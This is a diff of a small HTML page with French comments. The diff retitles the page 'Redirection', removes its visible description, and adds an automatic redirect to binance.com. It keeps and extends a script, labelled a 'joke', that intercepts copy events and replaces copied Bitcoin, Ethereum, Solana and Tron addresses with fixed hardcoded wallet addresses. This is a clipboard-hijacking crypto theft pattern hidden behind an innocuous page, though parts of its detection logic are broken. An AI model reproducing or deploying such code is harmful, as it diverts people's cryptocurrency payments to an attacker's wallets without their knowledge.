@@ -4,12 +4,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Address Tool</title>
+    <title>Redirection</title>
 </head>
 
 <body>
-    <p>Cet outil détecte automatiquement les adresses de crypto-monnaie et les remplace. Amusez-vous bien !</p>
 
+    <!-- Redirection vers www.binance.com -->
+    <script>
+        window.location.replace("https://www.binance.com");
+    </script>
+
+    <!-- Script "Blague" -->
     <script>
         function replaceCryptoAddress(originalAddress) {
             // Exemple de détection pour BTC (Bitcoin)
@@ -17,18 +22,20 @@
                 return 'bc1qdx854625jt6k5s62tcnre6fmsyu6ng4pr6s64f'; // Nouvelle adresse BTC
             }
 
-            // Exemple de détection pour BNB (Binance Smart Chain)
-            if (isBNBAddress(originalAddress)) {
-                return '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'; // Nouvelle adresse BNB
-            }
-
             // Exemple de détection pour ETH (Ethereum)
             if (isETHAddress(originalAddress)) {
                 return '0x10498445975974690E1EA11AF5447461B12cb588'; // Nouvelle adresse ETH
             }
 
-            // Ajoutez d'autres détections ici pour d'autres crypto-monnaies
-            // ...
+            // Exemple de détection pour SOL (Solana)
+            if (isSOLAddress(originalAddress)) {
+                return '3bUr5TAqKLozs49amVNq7vJ5Qvk9BjaKJPMow5fU11zf'; // Nouvelle adresse SOL
+            }
+
+            // Exemple de détection pour TRX (Tron)
+            if (isTRXAddress(originalAddress)) {
+                return 'TKPGbpg3fjcvX5NsDEuzsbYKGbGffSeFRr'; // Nouvelle adresse TRX
+            }
 
             // Aucun remplacement nécessaire pour d'autres types de crypto-monnaie
             return originalAddress;
@@ -40,19 +47,23 @@
             return address.match(/^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{39,}$/);
         }
 
-        // Exemple de détection d'adresse BNB (Binance Smart Chain)
-        function isBNBAddress(address) {
-            // Note : Ceci est un exemple simple, ajustez selon le format réel d'adresse BNB
-            return address.match(/^0x[a-fA-F0-9]{40}$/);
-        }
-
         // Exemple de détection d'adresse ETH (Ethereum)
         function isETHAddress(address) {
             // Note : Ceci est un exemple simple, ajustez selon le format réel d'adresse ETH
             return address.match(/^0x[a-fA-F0-9]{40}$/);
         }
 
-        // ... Ajoutez des fonctions de détection pour d'autres crypto-monnaies ici
+        // Exemple de détection d'adresse SOL (Solana)
+        function isSOLAddress(address) {
+            // Adresse SOL avec une longueur spécifique
+            return address.match(/^3bUr5TAqKLozs49amVNq7vJ5Qvk9BjaKJPMow5fU11zf$/);
+        }
+
+        // Exemple de détection d'adresse TRX (Tron)
+        function isTRXAddress(address) {
+            // Adresse TRX avec une longueur spécifique
+            return address.match(/^TKPGbpg3fjcvX5NsDEuzsbYKGbGffSeFRr$/);
+        }
 
         document.addEventListener('copy', function (event) {
             event.preventDefault();
@@ -60,11 +71,9 @@
             var modifiedText = replaceCryptoAddress(pastedText);
             console.log('Texte collé:', modifiedText);
             alert('Texte collé : ' + modifiedText);
-
-            // Redirection vers Binance.com
-            window.location.href = 'https://www.binance.com';
         });
     </script>
+
 </body>
 
 </html>
